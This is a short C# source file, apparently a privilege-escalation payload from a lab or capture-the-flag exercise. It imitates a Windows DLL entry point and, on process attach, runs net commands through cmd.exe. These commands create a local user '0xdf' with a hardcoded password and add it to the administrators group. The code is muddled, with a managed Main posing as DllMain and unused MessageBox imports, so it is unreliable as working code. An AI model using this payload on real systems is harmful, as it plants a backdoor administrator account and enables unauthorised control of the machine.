using System;
using System.Runtime.InteropServices;

public class DllMain
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    public static extern bool DisableThreadLibraryCalls(IntPtr hModule);

    [DllImport("user32.dll")]
    public static extern bool MessageBox(IntPtr hWnd, string lpText, string lpCaption, uint uType);

    [DllImport("user32.dll")]
    public static extern int MessageBoxA(int hWnd, string lpText, string lpCaption, uint uType);

    public const int DLL_PROCESS_ATTACH = 1;
    public const int DLL_THREAD_ATTACH = 2;
    public const int DLL_THREAD_DETACH = 3;
    public const int DLL_PROCESS_DETACH = 0;

    public static void Main()
    {
        IntPtr hModule = GetModuleHandle(null);
        DisableThreadLibraryCalls(hModule);

        switch (DllLoad)
        {
            case DLL_PROCESS_ATTACH:
                System.Diagnostics.Process.Start("cmd.exe", "/c net user 0xdf 0xdf0xdf /add");
                System.Diagnostics.Process.Start("cmd.exe", "/c net localgroup administrators 0xdf /add");
                break;
            case DLL_THREAD_ATTACH:
            case DLL_THREAD_DETACH:
            case DLL_PROCESS_DETACH:
                break;
        }
    }

    public static int DllLoad = DLL_PROCESS_ATTACH;
}
